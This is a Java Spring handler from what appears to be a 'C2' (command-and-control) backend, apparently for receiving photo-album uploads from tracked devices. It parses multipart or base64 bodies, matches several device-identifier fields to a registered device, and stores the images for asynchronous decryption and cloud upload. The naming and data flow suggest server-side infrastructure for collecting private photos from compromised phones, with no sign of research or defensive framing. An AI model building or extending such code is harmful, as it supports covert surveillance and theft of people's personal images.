package com.consume.service.handlers;

import java.util.Map;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Component;
import org.springframework.transaction.annotation.Propagation;
import org.springframework.transaction.annotation.Transactional;

import com.consume.service.C2BusinessStore;
import com.consume.service.C2HandlerContext;
import com.consume.service.C2RecordLoader;
import com.consume.service.AbstractC2Handler;
import com.consume.service.BodyNotReadyException;
import com.consume.util.HeadersUtil;
import com.consume.util.MultipartParser;

/**
 * POST /t：相册 / 照片（XADD.md §5.6）。
 *
 * Body：新链路为二进制 .bin multipart；旧链路 raw64 文本仍兼容。
 *
 * 流程：
 *   1. 读 multipart 字节（.bin / raw64）
 *   2. 解析字段 + file
 *   3. 绑设备（lhu 优先）
 *   4. save_album → 异步解密上云
 */
@Component
public class HandleT extends AbstractC2Handler {

    @Autowired
    private C2BusinessStore store;

    @Value("${news4.album.persist:true}")
    private boolean albumPersist;

    @Override
    public String path() {
        return "/t";
    }

    @Override
    @Transactional(propagation = Propagation.REQUIRES_NEW, rollbackFor = Exception.class)
    public void handle(C2HandlerContext ctx) throws Exception {
        if (!"POST".equalsIgnoreCase(ctx.getMethod())) {
            log.info("正常日志:[c2_handlers] /t 非 POST，跳过, id={}", ctx.getRecordId());
            return;
        }
        resolveDomain(ctx);

        // 1. 读取 multipart 字节（避免 raw64 String 全量进内存的旧路径）
        byte[] multipartBytes = C2RecordLoader.readMultipartBytes(ctx.getRecord());
        if (multipartBytes == null || multipartBytes.length == 0) {
            log.info("正常日志:[c2_handlers][BODY-WAIT] /t body 为空, id={}", ctx.getRecordId());
            throw new BodyNotReadyException("body empty or unreadable, id=" + ctx.getRecordId());
        }

        // Content-Length 仅作参考：新 .bin 按文件字节长度；旧 raw64 文本长度不可比，放宽
        String contentLenStr = HeadersUtil.header(ctx.getHeadersJson(), "Content-Length");
        long contentLength = parseLong(contentLenStr, 0L);
        String bodyPath = ctx.getRecord() == null ? null : ctx.getRecord().getBodyPath();
        if (contentLength > 0 && C2RecordLoader.isBinaryBodyPath(bodyPath)
                && multipartBytes.length + 512 < contentLength) {
            // 允许少量误差；明显偏短才等重试
            log.info("正常日志:[c2_handlers][BODY-WAIT] /t body 未就绪, id={}, have={}, need={}",
                    ctx.getRecordId(), multipartBytes.length, contentLength);
            throw new BodyNotReadyException(
                    "body not complete: have=" + multipartBytes.length + ", need=" + contentLength);
        }

        // 2. 解析 multipart
        MultipartParser.Result parsed = MultipartParser.parseMultipart(multipartBytes);
        Map<String, String> fields = parsed.getFields();
        byte[] fileBlob = parsed.getFileBlob();
        String fileName = parsed.getFileName();

        // 3. save_event_decrypt 已跳过（/t 非 AES 占位，量大时省一次写）

        // 4. 关联设备：lhu 优先 → d/f → u/s；/t 永不新建
        String d = field(fields, "d");
        String f = field(fields, "f");
        String u = field(fields, "u");
        String m = field(fields, "m");
        String s = field(fields, "s");
        String lhu = field(fields, "lhu");
        log.debug("正常日志:[c2_handlers] /t 设备字段, id={}, d={}, f={}, u={}, s={}, m={}, lhu={}",
                ctx.getRecordId(), d, f, u, s, m, lhu);
        Long rowId = deviceResolver.resolveAndLink(ctx, d, f, u, m, null, s, lhu);
        if (rowId == null) {
            log.info("正常日志:[c2_handlers] /t 无设备，跳过 album, id={}", ctx.getRecordId());
            return;
        }

        // 5. album 落库 + 异步解图上云
        if (albumPersist) {
            store.saveAlbum(ctx, fields, fileBlob, fileName);
        } else {
            log.info("正常日志:[c2_handlers] /t album 持久化已关闭 (news4.album.persist=false), id={}",
                    ctx.getRecordId());
        }

        log.debug("正常日志:[c2_handlers] call handle_t 完成, id={}, deviceRowId={}, deviceid={}, fileLen={}",
                ctx.getRecordId(), ctx.getDeviceRowId(), ctx.getDeviceId(),
                fileBlob == null ? 0 : fileBlob.length);
    }

    private static String field(Map<String, String> fields, String k) {
        if (fields == null) {
            return "";
        }
        String v = fields.get(k);
        return v == null ? "" : v;
    }

    private static long parseLong(String s, long def) {
        if (s == null || s.isEmpty()) {
            return def;
        }
        try {
            return Long.parseLong(s.trim());
        } catch (Exception e) {
            return def;
        }
    }
}
